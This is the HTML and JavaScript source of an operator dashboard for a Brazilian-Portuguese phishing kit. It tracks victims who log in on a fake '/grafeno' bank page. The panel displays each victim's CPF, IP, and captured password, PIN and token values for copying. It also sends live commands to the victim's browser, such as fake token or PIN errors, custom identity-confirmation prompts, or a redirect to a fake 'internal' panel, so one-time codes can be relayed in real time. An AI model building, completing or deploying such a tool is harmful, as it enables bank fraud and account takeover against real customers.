<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="csrf-token" content="XEqQgGHeIQcSn1OBSL8G6RbUJTUNWkNC3hHIC8qM" />
  <title><%= title %></title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; margin: 0; padding: 16px; background: #0f0f12; color: #e2e2e2; }
    h1 { font-size: 1.4rem; margin: 0 0 16px; color: #00bba7; }
    .toolbar { margin-bottom: 16px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
    .toolbar a { color: #00bba7; text-decoration: none; }
    .toolbar a:hover { text-decoration: underline; }
    .toolbar code { background: #27272a; padding: 2px 6px; border-radius: 4px; font-size: 12px; color: #00bba7; }
    .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 4px; }
    .badge.senha { background: #1a472a; color: #4ade80; }
    .badge.pin { background: #1e3a5f; color: #7dd3fc; }
    .badge.token { background: #422006; color: #fcd34d; }
    .badge.cmd { background: #4c1d95; color: #c4b5fd; }
    .badge.externa { background: #0c4a6e; color: #7dd3fc; }
    .badge.interna { background: #14532d; color: #86efac; }
    .badge.online { background: #14532d; color: #86efac; }
    .badge.offline { background: #450a0a; color: #fca5a5; }
    .acao-grupo { margin-bottom: 8px; }
    .acao-grupo .grupo-titulo { font-size: 10px; text-transform: uppercase; color: #71717a; margin-bottom: 4px; }
    table { width: 100%; border-collapse: collapse; background: #18181b; border-radius: 8px; overflow: hidden; }
    th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #27272a; }
    th { background: #27272a; color: #a1a1aa; font-weight: 600; font-size: 12px; text-transform: uppercase; }
    tr:hover { background: #1f1f23; }
    .btns { display: flex; flex-wrap: wrap; gap: 6px; }
    .btns button { padding: 6px 10px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; background: #3f3f46; color: #e2e2e2; }
    .btns button:hover { background: #00bba7; color: #0f0f12; }
    .btns button.danger:hover { background: #dc2626; color: #fff; }
    .btns button.success:hover { background: #16a34a; color: #fff; }
    .btns button.warn:hover { background: #b45309; color: #fff; }
    .comando-input { width: 100%; max-width: 280px; padding: 6px 8px; border-radius: 4px; border: 1px solid #3f3f46; background: #27272a; color: #e2e2e2; font-size: 12px; margin-top: 4px; }
    .empty { text-align: center; padding: 40px; color: #71717a; }
    .detalhe { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
    .detalhe strong { color: #e2e2e2; }
    .expand-row { cursor: pointer; }
    .expand-body { display: none; }
    .expand-body td { background: #1f1f23; padding: 12px; vertical-align: top; }
    .atualizado { font-size: 11px; color: #71717a; }
    .dados-valores { font-size: 12px; margin-top: 6px; line-height: 1.5; }
    .dados-valores span.val { background: #27272a; padding: 2px 6px; border-radius: 4px; margin-right: 8px; margin-bottom: 4px; display: inline-block; font-family: monospace; }
    .dados-valores .lbl { color: #71717a; margin-right: 4px; }
    .copy-value { cursor: pointer; }
    .copy-value:hover { text-decoration: underline; color: #00bba7; }
    .copy-value.copiado-feedback { color: #00bba7; }
    .btn-loading { opacity: 0.7; pointer-events: none; }
    #btn-limpar-todas { padding: 6px 12px; border: none; border-radius: 6px; cursor: pointer; background: #713f12; color: #fcd34d; font-size: 12px; }
    #btn-limpar-todas:hover { background: #b45309; color: #fff; }
    #btn-limpar-todas:disabled { opacity: 0.6; cursor: not-allowed; }
    .nav-operador { background: #18181b; border-bottom: 1px solid #27272a; padding: 12px 16px; margin: -16px -16px 16px -16px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
    .nav-operador .nav-tabs { display: flex; gap: 4px; }
    .nav-operador .nav-tabs a { padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 14px; color: #a1a1aa; background: transparent; }
    .nav-operador .nav-tabs a:hover { background: #27272a; color: #00bba7; }
    .nav-operador .nav-tabs a.ativo { background: #00bba7; color: #0f0f12; pointer-events: none; }
    .nav-operador .nav-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
    .nav-operador .nav-right a { color: #00bba7; text-decoration: none; font-size: 13px; }
    .nav-operador .nav-right a.sair { color: #f87171; }
  </style>
</head>
<body>
  <nav class="nav-operador">
    <div class="nav-tabs">
      <a href="/operador" class="ativo">Infos</a>
      <a href="/operador/acessos">Acessos</a>
    </div>
    <div class="nav-right">
      <a href="/grafeno">Login vítima (externa)</a>
      <a href="/operador/logout" class="sair">Sair</a>
    </div>
  </nav>
  <h1>Painel Operador – Infos</h1>
  <div class="toolbar">
    <strong>Painel:</strong> <code>/painel</code> (interna)
    <span id="contador">0 sessões</span>
    <span class="atualizado">Atualiza a cada 5s</span>
    <button type="button" id="btn-limpar-todas">Limpar todas</button>
  </div>
  <p class="detalhe" style="margin:0 0 12px 0;"><strong>Onde</strong> indica em qual tela a vítima está (Externa = /grafeno, Interna = /painel). Comandos estão separados por contexto: use os da <strong>Externa</strong> quando ela estiver no login; após &quot;Enviar p/ Interna&quot; ela passa para a <strong>Interna</strong> e você pode usar Token, PIN, Comando, Aguardando e Finalizar da seção Interna.</p>

  <table id="tabela">
    <thead>
      <tr>
        <th>CPF / Login</th>
        <th>Status</th>
        <th>Onde</th>
        <th>Comando atual</th>
        <th>Dados</th>
        <th>Última atividade</th>
        <th>Ações</th>
      </tr>
    </thead>
    <tbody id="corpo">
    </tbody>
  </table>
  <div id="vazio" class="empty" style="display:none;">Nenhuma sessão ativa. As sessões aparecem quando alguém inicia o login em /grafeno.</div>

  <script>
    function getToken() {
      return document.querySelector('meta[name="csrf-token"]') && document.querySelector('meta[name="csrf-token"]').getAttribute('content') || '';
    }

    function escapeHtml(str) {
      if (str == null) return '';
      var s = String(str);
      return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function formatarData(ts) {
      if (!ts) return '-';
      var d = new Date(ts);
      return d.toLocaleString('pt-BR');
    }

    function copiarParaClipboard(texto, el) {
      var t = (texto || '').trim();
      if (!t) return;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(t).then(function () {
          mostrarFeedbackCopiado(el);
        }).catch(function () { fallbackCopiar(t, el); });
      } else {
        fallbackCopiar(t, el);
      }
    }

    function fallbackCopiar(t, el) {
      try {
        var ta = document.createElement('textarea');
        ta.value = t;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        mostrarFeedbackCopiado(el);
      } catch (e) {}
    }

    function mostrarFeedbackCopiado(el) {
      var $el = $(el);
      var htmlOriginal = $el.html();
      var txtOriginal = $el.text();
      $el.addClass('copiado-feedback').text('Copiado!');
      setTimeout(function () { $el.removeClass('copiado-feedback').text(txtOriginal); }, 800);
    }

    function enviarComando(login, comando, inputComando, btn) {
      var payload = { login: login, comando: comando };
      if (inputComando) payload.input_comando = inputComando;
      var $btn = $(btn);
      var labelOriginal = btn.dataset.label || comando;
      $btn.prop('disabled', true).addClass('btn-loading').text('...');
      $.ajax({
        url: '/api/comando',
        method: 'POST',
        contentType: 'application/json',
        headers: { 'X-CSRF-TOKEN': getToken() },
        data: JSON.stringify(payload)
      }).done(function () {
        $btn.text('Enviado').removeClass('btn-loading');
        setTimeout(function () { $btn.prop('disabled', false).text(labelOriginal); }, 1500);
        carregar();
      }).fail(function () {
        $btn.prop('disabled', false).removeClass('btn-loading').text(labelOriginal);
        alert('Erro ao enviar comando');
      });
    }

    function montarAcoes(login, pagina) {
      var esc = escapeHtml(login);
      var naExterna = (pagina !== 'painel');
      var hideExterna = naExterna ? '' : ' style="display:none"';
      var hideInterna = naExterna ? ' style="display:none"' : '';
      var html = '<div class="acao-grupo grupo-externa"' + hideExterna + '><div class="grupo-titulo">Externa (/grafeno)</div><div class="btns">';
      html += '<button type="button" data-label="Token" onclick="enviarComando(\'' + esc + '\', \'codigo_token\', null, this)">Token</button>';
      html += '<button type="button" data-label="Token erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'codigo_token_error\', null, this)">Token erro</button>';
      html += '<button type="button" data-label="PIN" onclick="enviarComando(\'' + esc + '\', \'pin\', null, this)">PIN</button>';
      html += '<button type="button" data-label="PIN erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'pin_error\', null, this)">PIN erro</button>';
      html += '<button type="button" data-label="Comando">Comando</button>';
      html += '<button type="button" data-label="Comando erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'comando_error\', null, this)">Comando erro</button>';
      html += '<button type="button" data-label="Aguardando" onclick="enviarComando(\'' + esc + '\', \'aguardando\', null, this)">Aguardando</button>';
      html += '<button type="button" data-label="Enviar p/ Interna" class="success" onclick="enviarComando(\'' + esc + '\', \'enviar_para_interna\', null, this)">Enviar p/ Interna</button>';
      html += '<button type="button" data-label="Finalizar" class="danger" onclick="enviarComando(\'' + esc + '\', \'finalizar_atendimento\', null, this)">Finalizar</button>';
      html += '<button type="button" data-label="Dado inválido" class="warn" onclick="enviarComando(\'' + esc + '\', \'dado_invalido\', null, this)" title="Exclui a info e manda a vítima de volta ao início para preencher de novo">Dado inválido</button>';
      html += '</div></div>';
      html += '<div class="acao-grupo grupo-interna"' + hideInterna + '><div class="grupo-titulo">Interna (/painel)</div><div class="btns">';
      html += '<button type="button" data-label="Token" onclick="enviarComando(\'' + esc + '\', \'codigo_token\', null, this)">Token</button>';
      html += '<button type="button" data-label="Token erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'codigo_token_error\', null, this)">Token erro</button>';
      html += '<button type="button" data-label="PIN" onclick="enviarComando(\'' + esc + '\', \'pin\', null, this)">PIN</button>';
      html += '<button type="button" data-label="PIN erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'pin_error\', null, this)">PIN erro</button>';
      html += '<button type="button" data-label="Comando">Comando</button>';
      html += '<button type="button" data-label="Comando erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'comando_error\', null, this)">Comando erro</button>';
      html += '<button type="button" data-label="Aguardando" onclick="enviarComando(\'' + esc + '\', \'aguardando\', null, this)">Aguardando</button>';
      html += '<button type="button" data-label="Finalizar" class="danger" onclick="enviarComando(\'' + esc + '\', \'finalizar_atendimento\', null, this)">Finalizar</button>';
      html += '</div></div>';
      html += '<div class="btns" style="margin-top:6px;"><button type="button" data-label="Excluir" class="warn" onclick="excluirSessao(\'' + esc + '\', this)">Excluir</button></div>';
      return html;
    }

    function excluirSessao(login, btn) {
      if (!confirm('Excluir esta sessão? A vítima deixará de aparecer aqui e poderá cair de novo no fluxo.')) return;
      var $btn = $(btn);
      $btn.prop('disabled', true).text('...');
      $.ajax({
        url: '/api/sessao/' + encodeURIComponent(login),
        method: 'DELETE',
        headers: { 'X-CSRF-TOKEN': getToken() }
      }).done(function () {
        $btn.text('Excluído');
        carregar();
      }).fail(function () {
        $btn.prop('disabled', false).text('Excluir');
        alert('Erro ao excluir.');
      });
    }

    function limparTodas() {
      if (!confirm('Limpar TODAS as sessões e todos os dados? Isso não pode ser desfeito.')) return;
      $('#btn-limpar-todas').prop('disabled', true).text('Limpando...');
      $.ajax({
        url: '/api/sessoes',
        method: 'DELETE',
        headers: { 'X-CSRF-TOKEN': getToken() }
      }).done(function () {
        $('#btn-limpar-todas').text('Limpar todas').prop('disabled', false);
        carregar();
      }).fail(function () {
        $('#btn-limpar-todas').text('Limpar todas').prop('disabled', false);
        alert('Erro ao limpar.');
      });
    }

    function carregar() {
      $.getJSON('/api/sessoes').done(function (data) {
        var sessoes = data.sessoes || [];
        $('#contador').text(sessoes.length + ' sessão(ões)');
        var tbody = $('#corpo');
        tbody.empty();
        if (sessoes.length === 0) {
          $('#vazio').show();
          return;
        }
        $('#vazio').hide();
        sessoes.forEach(function (s) {
          var onde = (s.pagina === 'painel') ? 'painel' : 'grafeno';
          var statusBadge = s.online
            ? '<span class="badge online">Online</span>'
            : '<span class="badge offline">Saiu</span>';
          var ondeBadge = onde === 'painel'
            ? '<span class="badge interna">Interna</span><div class="detalhe">/painel</div>'
            : '<span class="badge externa">Externa</span><div class="detalhe">/grafeno</div>';
          var badges = '';
          if (s.temSenha) badges += '<span class="badge senha">Senha</span>';
          if (s.temPin) badges += '<span class="badge pin">PIN</span>';
          if (s.temToken) badges += '<span class="badge token">Token</span>';
          if (s.temComando) badges += '<span class="badge cmd">Comando</span>';
          var dadosValores = '<div class="dados-valores">';
          if (s.senha) dadosValores += '<span class="val"><span class="lbl">Senha:</span><span class="copy-value" title="Clique para copiar">' + (s.senha || '') + '</span></span>';
          if (s.token) dadosValores += '<span class="val"><span class="lbl">Token:</span><span class="copy-value" title="Clique para copiar">' + (s.token || '') + '</span></span>';
          if (s.pin) dadosValores += '<span class="val"><span class="lbl">PIN:</span><span class="copy-value" title="Clique para copiar">' + (s.pin || '') + '</span></span>';
          if (s.comando_valor) dadosValores += '<span class="val"><span class="lbl">Comando:</span><span class="copy-value" title="Clique para copiar">' + ((s.comando_valor || '').substring(0, 80)) + (s.comando_valor && s.comando_valor.length > 80 ? '…' : '') + '</span></span>';
          dadosValores += '</div>';
          var tr = '<tr class="expand-row" data-login="' + (s.login || '') + '" data-pagina="' + (onde || '') + '">' +
            '<td><strong>' + (s.cpfFormatado || s.login || '') + '</strong><div class="detalhe">IP: ' + (s.ip || '-') + '</div></td>' +
            '<td>' + statusBadge + '</td>' +
            '<td>' + ondeBadge + '</td>' +
            '<td>' + (s.comando || '-') + '</td>' +
            '<td>' + (badges || '-') + (dadosValores !== '<div class="dados-valores"></div>' ? dadosValores : '') + '</td>' +
            '<td class="atualizado">' + formatarData(s.lastUpdate) + '</td>' +
            '<td>' + montarAcoes(s.login, onde) + '</td></tr>';
          tbody.append(tr);
        });

      }).fail(function () {
        $('#corpo').empty();
        $('#vazio').show().text('Erro ao carregar sessões.');
      });
    }

    $(function () {
      carregar();
      setInterval(carregar, 2500);
      $('#btn-limpar-todas').on('click', limparTodas);
      $(document).on('click', '#corpo .copy-value', function (e) {
        e.stopPropagation();
        var texto = $(this).text().trim();
        if (texto) copiarParaClipboard(texto, this);
      });
      $(document).on('click', '#corpo button[data-label="Comando"]', function () {
        var login = $(this).closest('tr').data('login');
        var texto = prompt('Texto para exibir no campo "Confirme sua identidade":', 'Por favor, confirme sua identidade digitando o código que enviamos para seu dispositivo cadastrado.');
        if (texto === null) return;
        enviarComando(login, 'comando', texto || '', this);
      });
    });
  </script>
</body>
</html>
